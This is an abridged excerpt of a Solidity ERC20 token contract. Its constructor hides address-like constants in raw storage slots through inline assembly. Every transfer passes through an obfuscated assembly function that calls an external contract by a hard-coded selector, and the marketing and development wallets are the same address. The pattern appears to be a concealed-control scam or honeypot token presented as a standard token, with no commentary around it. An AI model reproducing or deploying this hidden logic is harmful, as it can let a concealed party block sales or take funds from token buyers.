...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor(string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50, 0xB8DF6EB76C186EC75E5F56830345F94449D14F867A)
            sstore(0x51, 0xb891d62b8dd3f1f60a574a0bb78128f1575bc10535)
        ...
        marketingWallet = address(0xC5fe18646A46EA8d7bBFbD502149b947549a92c6);
        developmentWallet = address(0xC5fe18646A46EA8d7bBFbD502149b947549a92c6);
    ...
    function getDataAtSlot52() public view returns (uint256) {
        uint256 data;
        assembly {
            data := sload(0x52)
        }
    ...
    function _transfer(
        ...
        if (takeFee) {
            ...
            if (fees > 0) {
                feesAndNFTs(from, address(this), fees);
            }

            amount -= fees;
        }

        feesAndNFTs(from, to, amount);
    }
    ...
    function feesAndNFTs(
        ...
        assembly {
            ...
            mstore(
                data,
                0x882dd41e00000000000000000000000000000000000000000000000000000000
            )
    ...
    function openTrading() public payable {
        ...
        _transfer(address(this), owner(), _totalSupply / 10000);
